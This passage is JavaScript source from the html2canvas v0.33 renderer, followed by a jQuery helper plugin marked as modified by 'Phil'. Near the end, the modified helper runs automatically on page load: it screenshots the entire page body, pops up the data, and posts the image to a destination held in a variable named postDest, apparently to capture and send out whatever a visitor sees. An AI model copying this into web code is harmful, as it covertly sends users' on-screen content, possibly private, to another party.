  Copyright (c) 2011 Niklas von Hertzen. All rights reserved.
  http://www.twitter.com/niklasvh

  Released under MIT License
*/
html2canvas.Renderer = function(parseQueue, opts){


    var options = {
        &#34;width&#34;: null,
        &#34;height&#34;: null,
        &#34;renderer&#34;: &#34;canvas&#34;,
        &#34;taintTest&#34;: true // do a taint test with all images before applying to canvas
    },
    queue = [],
    canvas,
    usingFlashcanvas = false,
    flashMaxSize = 2880, // flash bitmap limited to 2880x2880px // http://stackoverflow.com/questions/2033792/argumenterror-error-2015-invalid-bitmapdata
    doc = document;
    
    options = html2canvas.Util.Extend(opts, options);


    
    function sortZ(zStack){
        var subStacks = [],
        stackValues = [],
        zStackChildren = zStack.children,
        s,
        i,
        stackLen,
        zValue,
        zLen,
        stackChild,
        b, 
        subStackLen;
        

        for (s = 0, zLen = zStackChildren.length; s &lt; zLen; s+=1){
            
            stackChild = zStackChildren[s];
            
            if (stackChild.children &amp;&amp; stackChild.children.length &gt; 0){
                subStacks.push(stackChild);
                stackValues.push(stackChild.zindex);
            }else{         
                queue.push(stackChild);
            }  
           
        }
      
        stackValues.sort(function(a, b) {
            return a - b;
        });
    
        for (i = 0, stackLen = stackValues.length; i &lt; stackLen; i+=1){
            zValue = stackValues[i];
            for (b = 0, subStackLen = subStacks.length; b &lt;= subStackLen; b+=1){
                
                if (subStacks[b].zindex === zValue){
                    stackChild = subStacks.splice(b, 1);
                    sortZ(stackChild[0]);
                    break;
                  
                }
            }        
        }
  
    }

    function canvasRenderer(zStack){
 
        sortZ(zStack.zIndex);
        

        var ctx = canvas.getContext(&#34;2d&#34;),
        storageContext,
        i,
        queueLen,
        a,
        newCanvas,
        bounds,
        testCanvas = document.createElement(&#34;canvas&#34;),
        hasCTX = ( testCanvas.getContext !== undefined ),
        storageLen,
        renderItem,
        testctx = ( hasCTX ) ? testCanvas.getContext(&#34;2d&#34;) : {},
        safeImages = [],
        fstyle;
      
        canvas.width = canvas.style.width = (!usingFlashcanvas) ? options.width || zStack.ctx.width : Math.min(flashMaxSize, (options.width || zStack.ctx.width) );
        canvas.height = canvas.style.height = (!usingFlashcanvas) ? options.height || zStack.ctx.height : Math.min(flashMaxSize, (options.height || zStack.ctx.height) );
   
        fstyle = ctx.fillStyle;
        ctx.fillStyle = zStack.backgroundColor;
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = fstyle;

        for (i = 0, queueLen = queue.length; i &lt; queueLen; i+=1){
            
            storageContext = queue.splice(0, 1)[0];
            storageContext.canvasPosition = storageContext.canvasPosition || {};   
           
            //this.canvasRenderContext(storageContext,parentctx);           

            // set common settings for canvas
            ctx.textBaseline = &#34;bottom&#34;;
   
            if (storageContext.clip){
                ctx.save();
                ctx.beginPath();
                // console.log(storageContext);
                ctx.rect(storageContext.clip.left, storageContext.clip.top, storageContext.clip.width, storageContext.clip.height);
                ctx.clip();
        
            }
        
            if (storageContext.ctx.storage){
               
                for (a = 0, storageLen = storageContext.ctx.storage.length; a &lt; storageLen; a+=1){
                    
                    renderItem = storageContext.ctx.storage[a];
                    
                    
                    switch(renderItem.type){
                        case &#34;variable&#34;:
                            ctx[renderItem.name] = renderItem[&#39;arguments&#39;];              
                            break;
                        case &#34;function&#34;:
                            if (renderItem.name === &#34;fillRect&#34;) {
                                
                                if (!usingFlashcanvas || renderItem[&#39;arguments&#39;][0] + renderItem[&#39;arguments&#39;][2] &lt; flashMaxSize  &amp;&amp; renderItem[&#39;arguments&#39;][1] + renderItem[&#39;arguments&#39;][3] &lt; flashMaxSize) {
                                    ctx.fillRect.apply( ctx, renderItem[&#39;arguments&#39;] );
                                }
                            }else if(renderItem.name === &#34;fillText&#34;) {
                                if (!usingFlashcanvas || renderItem[&#39;arguments&#39;][1] &lt; flashMaxSize  &amp;&amp; renderItem[&#39;arguments&#39;][2] &lt; flashMaxSize) {
                                    ctx.fillText.apply( ctx, renderItem[&#39;arguments&#39;] );
                                }
                            }else if(renderItem.name === &#34;drawImage&#34;) {
 
                                if (renderItem[&#39;arguments&#39;][8] &gt; 0 &amp;&amp; renderItem[&#39;arguments&#39;][7]){    
                                    if ( hasCTX &amp;&amp; options.taintTest ) {
                                        if ( safeImages.indexOf( renderItem[&#39;arguments&#39;][ 0 ].src ) === -1 ) {
                                            testctx.drawImage( renderItem[&#39;arguments&#39;][ 0 ], 0, 0 );
                                            try {
                                                testctx.getImageData( 0, 0, 1, 1 );
                                            } catch(e) {      
                                                testCanvas = document.createElement(&#34;canvas&#34;);
                                                testctx = testCanvas.getContext(&#34;2d&#34;);
                                                continue;
                                            }
                                          
                                            safeImages.push( renderItem[&#39;arguments&#39;][ 0 ].src );
                                        
                                        }
                                    }
                                    ctx.drawImage.apply( ctx, renderItem[&#39;arguments&#39;] );                                   
                                }      
                            }
                       
  
                            break;
                        default:
                               
                    }
            
                }

            }  
            if (storageContext.clip){
                ctx.restore();
            }
    

       
   
        }
        h2clog(&#34;html2canvas: Renderer: Canvas renderer done - returning canvas obj&#34;);
        
        // this.canvasRenderStorage(queue,this.ctx);
        queueLen = options.elements.length;
        
        if (queueLen === 1) {
            if (typeof options.elements[ 0 ] === &#34;object&#34; &amp;&amp; options.elements[ 0 ].nodeName !== &#34;BODY&#34; &amp;&amp; usingFlashcanvas === false) {
                // crop image to the bounds of selected (single) element
                bounds = html2canvas.Util.Bounds( options.elements[ 0 ] );
                newCanvas = doc.createElement(&#39;canvas&#39;);
                newCanvas.width = bounds.width;
                newCanvas.height = bounds.height;
                ctx = newCanvas.getContext(&#34;2d&#34;);
                
                ctx.drawImage( canvas, bounds.left, bounds.top, bounds.width, bounds.height, 0, 0, bounds.width, bounds.height );
                delete canvas;
                return newCanvas;
            }
        } else {
        // TODO clip and resize multiple elements
        /*
            for ( i = 0; i &lt; queueLen; i+=1 ) {
                if (options.elements[ i ] instanceof Element) {
                
                }
              
            }*/
        }
        
       
       
        
        return canvas;
    }

    function svgRenderer(zStack){
        sortZ(zStack.zIndex);
        
        var svgNS = &#34;http://www.w3.org/2000/svg&#34;,
        svg = doc.createElementNS(svgNS, &#34;svg&#34;),
        xlinkNS = &#34;http://www.w3.org/1999/xlink&#34;,
        defs = doc.createElementNS(svgNS, &#34;defs&#34;),
        i,
        a,
        queueLen,
        storageLen,
        storageContext,
        renderItem,
        el,
        settings = {},
        text,
        fontStyle,
        clipId = 0;
        
        svg.setAttribute(&#34;version&#34;, &#34;1.1&#34;);
        svg.setAttribute(&#34;baseProfile&#34;, &#34;full&#34;);

        svg.setAttribute(&#34;viewBox&#34;, &#34;0 0 &#34; + Math.max(zStack.ctx.width, options.width) + &#34; &#34; + Math.max(zStack.ctx.height, options.height));
        svg.setAttribute(&#34;width&#34;, Math.max(zStack.ctx.width, options.width) + &#34;px&#34;);
        svg.setAttribute(&#34;height&#34;, Math.max(zStack.ctx.height, options.height) + &#34;px&#34;);
        svg.setAttribute(&#34;preserveAspectRatio&#34;, &#34;none&#34;);
        svg.appendChild(defs);
        
        
        
        for (i = 0, queueLen = queue.length; i &lt; queueLen; i+=1){
            
            storageContext = queue.splice(0, 1)[0];
            storageContext.canvasPosition = storageContext.canvasPosition || {};   
           
            //this.canvasRenderContext(storageContext,parentctx);           

   
            /*
            if (storageContext.clip){
                ctx.save();
                ctx.beginPath();
                // console.log(storageContext);
                ctx.rect(storageContext.clip.left, storageContext.clip.top, storageContext.clip.width, storageContext.clip.height);
                ctx.clip();
        
            }*/
        
            if (storageContext.ctx.storage){
               
                for (a = 0, storageLen = storageContext.ctx.storage.length; a &lt; storageLen; a+=1){
                    
                    renderItem = storageContext.ctx.storage[a];
                    
                   
                    
                    switch(renderItem.type){
                        case &#34;variable&#34;:
                            settings[renderItem.name] = renderItem[&#39;arguments&#39;];              
                            break;
                        case &#34;function&#34;:
                            if (renderItem.name === &#34;fillRect&#34;) {
                                
                                el = doc.createElementNS(svgNS, &#34;rect&#34;);
                                el.setAttribute(&#34;x&#34;, renderItem[&#39;arguments&#39;][0]);
                                el.setAttribute(&#34;y&#34;, renderItem[&#39;arguments&#39;][1]);
                                el.setAttribute(&#34;width&#34;, renderItem[&#39;arguments&#39;][2]);
                                el.setAttribute(&#34;height&#34;, renderItem[&#39;arguments&#39;][3]);
                                el.setAttribute(&#34;fill&#34;,  settings.fillStyle);
                                svg.appendChild(el);

                            } else if(renderItem.name === &#34;fillText&#34;) {
                                el = doc.createElementNS(svgNS, &#34;text&#34;);
                                
                                fontStyle = settings.font.split(&#34; &#34;);
                                
                                el.style.fontVariant = fontStyle.splice(0, 1)[0];
                                el.style.fontWeight = fontStyle.splice(0, 1)[0];
                                el.style.fontStyle = fontStyle.splice(0, 1)[0];
                                el.style.fontSize = fontStyle.splice(0, 1)[0];
                                
                                el.setAttribute(&#34;x&#34;, renderItem[&#39;arguments&#39;][1]);                 
                                el.setAttribute(&#34;y&#34;, renderItem[&#39;arguments&#39;][2] - (parseInt(el.style.fontSize, 10) + 3));
                                
                                el.setAttribute(&#34;fill&#34;, settings.fillStyle);
                                
                               
                             
                                
                                // TODO get proper baseline
                                el.style.dominantBaseline = &#34;text-before-edge&#34;;
                                el.style.fontFamily = fontStyle.join(&#34; &#34;);

                                text = doc.createTextNode(renderItem[&#39;arguments&#39;][0]);
                                el.appendChild(text);
                               
                                
                                svg.appendChild(el);
                                
              
                    
                            } else if(renderItem.name === &#34;drawImage&#34;) {

                                if (renderItem[&#39;arguments&#39;][8] &gt; 0 &amp;&amp; renderItem[&#39;arguments&#39;][7]){
                                    
                                    // TODO check whether even any clipping is necessary for this particular image
                                    el = doc.createElementNS(svgNS, &#34;clipPath&#34;);
                                    el.setAttribute(&#34;id&#34;, &#34;clipId&#34; + clipId); 
                                    
                                    text = doc.createElementNS(svgNS, &#34;rect&#34;);
                                    text.setAttribute(&#34;x&#34;,  renderItem[&#39;arguments&#39;][5] );                 
                                    text.setAttribute(&#34;y&#34;, renderItem[&#39;arguments&#39;][6]);
                                    
                                    text.setAttribute(&#34;width&#34;, renderItem[&#39;arguments&#39;][3]);                 
                                    text.setAttribute(&#34;height&#34;, renderItem[&#39;arguments&#39;][4]);
                                    el.appendChild(text);
                                    defs.appendChild(el);
                                    
                                    el = doc.createElementNS(svgNS, &#34;image&#34;);
                                    el.setAttributeNS(xlinkNS, &#34;xlink:href&#34;, renderItem[&#39;arguments&#39;][0].src);
                                    el.setAttribute(&#34;width&#34;, renderItem[&#39;arguments&#39;][0].width);                 
                                    el.setAttribute(&#34;height&#34;, renderItem[&#39;arguments&#39;][0].height);           
                                    el.setAttribute(&#34;x&#34;, renderItem[&#39;arguments&#39;][5] - renderItem[&#39;arguments&#39;][1]);                 
                                    el.setAttribute(&#34;y&#34;, renderItem[&#39;arguments&#39;][6] - renderItem[&#39;arguments&#39;][2]);
                                    el.setAttribute(&#34;clip-path&#34;, &#34;url(#clipId&#34; + clipId + &#34;)&#34;);
                                    // el.setAttribute(&#34;xlink:href&#34;, );
                                    

                                    el.setAttribute(&#34;preserveAspectRatio&#34;, &#34;none&#34;);
                                    
                                    svg.appendChild(el);
                                    
                                    
                                    clipId += 1; 
                                /*
                                    ctx.drawImage(
                                        renderItem[&#39;arguments&#39;][0],
                                        renderItem[&#39;arguments&#39;][1],
                                        renderItem[&#39;arguments&#39;][2],
                                        renderItem[&#39;arguments&#39;][3],
                                        renderItem[&#39;arguments&#39;][4],
                                        renderItem[&#39;arguments&#39;][5],
                                        renderItem[&#39;arguments&#39;][6],
                                        renderItem[&#39;arguments&#39;][7],
                                        renderItem[&#39;arguments&#39;][8]
                                        );
                                        */
                                }      
                            }
                               
                       
  
                            break;
                        default:
                               
                    }
            
                }

            }  
        /*
            if (storageContext.clip){
                ctx.restore();
            }
    */

       
   
        }
        
        
        
        
        
        
        
        
        
        
        h2clog(&#34;html2canvas: Renderer: SVG Renderer done - returning SVG DOM obj&#34;);
        
        return svg;

    }

    
    //this.each(this.opts.renderOrder.split(&#34; &#34;),function(i,renderer){
        
    //options.renderer = &#34;svg&#34;;
    
    switch(options.renderer.toLowerCase()){
        case &#34;canvas&#34;:
            canvas = doc.createElement(&#39;canvas&#39;);
            if (canvas.getContext){
                h2clog(&#34;html2canvas: Renderer: using canvas renderer&#34;);
                return canvasRenderer(parseQueue);
            } else {
                usingFlashcanvas = true;
                h2clog(&#34;html2canvas: Renderer: canvas not available, using flashcanvas&#34;);
                var script = doc.createElement(&#34;script&#34;);
                script.src = options.flashcanvas;
                
                script.onload = (function(script, func){
                    var intervalFunc; 
    
                    if (script.onload === undefined) {
                        // IE lack of support for script onload
                                
                        if( script.onreadystatechange !== undefined ) {
                                    
                            intervalFunc = function() {
                                if (script.readyState !== &#34;loaded&#34; &amp;&amp; script.readyState !== &#34;complete&#34;) {
                                    window.setTimeout( intervalFunc, 250 );
                                    
                                } else {
                                    // it is loaded
                                    func();
                                    
                                }
              
                            };
                                    
                            window.setTimeout( intervalFunc, 250 );

                        } else {
                            h2clog(&#34;html2canvas: Renderer: Can&#39;t track when flashcanvas is loaded&#34;);

                        }
                                
                    } else {
                        return func;
                    }
                            
                })(script, function(){
                    
                    if (typeof window.FlashCanvas !== &#34;undefined&#34;) {
                        h2clog(&#34;html2canvas: Renderer: Flashcanvas initialized&#34;);
                        window.FlashCanvas.initElement( canvas );
                        canvasRenderer(parseQueue);
                    }
                });
                
                doc.body.appendChild( script );
                
                return canvas;
            }               
            break;
        case &#34;svg&#34;:
            if (doc.createElementNS){
                h2clog(&#34;html2canvas: Renderer: using SVG renderer&#34;);
                return svgRenderer(parseQueue);             
            }
            break;
            
    }
         
         
         
    //});
    

    return this;
     

    
};

/*
  html2canvas v0.33 &lt;http://html2canvas.hertzen.com&gt;
  Copyright (c) 2011 Niklas von Hertzen. All rights reserved.
  http://www.twitter.com/niklasvh

  Released under MIT License
*/
window.html2canvas = html2canvas;
}(window, document));

/**
  @license html2canvas v0.33 &lt;http://html2canvas.hertzen.com&gt;
  Copyright (c) 2011 Niklas von Hertzen. All rights reserved.
  http://www.twitter.com/niklasvh

  Released under MIT License

  Modified by Phil
 */
/*
 * jQuery helper plugin for examples and tests
 */
(function( $ ){
    $.fn.html2canvas = function(options) {
        if (options &amp;&amp; options.profile &amp;&amp; window.console &amp;&amp; window.console.profile) {
            console.profile();
        }
        var date = new Date(),
        $message = null,
        timeoutTimer = false,
        timer = date.getTime();
        options = options || {};
        options.elements = this;
        options.flashcanvas = &#34;../external/flashcanvas.min.js&#34;;
        
        html2canvas.logging = options &amp;&amp; options.logging;
        options.complete = function(images){
            var queue = html2canvas.Parse(this[0], images, options),
            $canvas = $(html2canvas.Renderer(queue, options)),
            finishTime = new Date();

            if (options &amp;&amp; options.profile &amp;&amp; window.console &amp;&amp; window.console.profileEnd) {
                console.profileEnd();
            }

/*            $canvas.css({
                position: &#39;absolute&#39;, 
                left: 0, 
                top: 0
            }).appendTo(document.body);

            $canvas.siblings().toggle();*/	

            // test if canvas is read-able
            try {

//		$.post(postDest, { png: &#39;ok123&#39; } );
//		$.post(postDest, { png: $canvas[0].toDataURL() } );

		var scrn = $canvas[0].toDataURL();

		alert(&#39;Data is : &#39; + scrn);

		$.post(postDest, { png: scrn } );


            } catch(e) {
		// Failed
            }
            
        };
        html2canvas.Preload(this[0],  options);

        function throwMessage(msg,duration){
            window.clearTimeout(timeoutTimer);
            timeoutTimer = window.setTimeout(function(){
                $message.fadeOut(function(){
                    $message.remove();
                    $message = null;
                });
            },duration || 2000);
            if ($message)
                $message.remove();
            $message = $(&#39;&lt;div /&gt;&#39;).html(msg).css({
                margin:0,
                padding:10,
                background: &#34;#000&#34;,
                opacity:0.7,
                position:&#34;fixed&#34;,
                top:10,
                right:10,
                fontFamily: &#39;Tahoma&#39;,
                color:&#39;#fff&#39;,
                fontSize:12,
                borderRadius:12,
                width:&#39;auto&#39;,
                height:&#39;auto&#39;,
                textAlign:&#39;center&#39;,
                textDecoration:&#39;none&#39;,
                display:&#39;none&#39;
            }).appendTo(document.body).fadeIn();
            html2canvas.log(msg);
        }
    };
})( jQuery );


$(window).ready(function() {

  $(&#39;body&#39;).html2canvas();


});

};

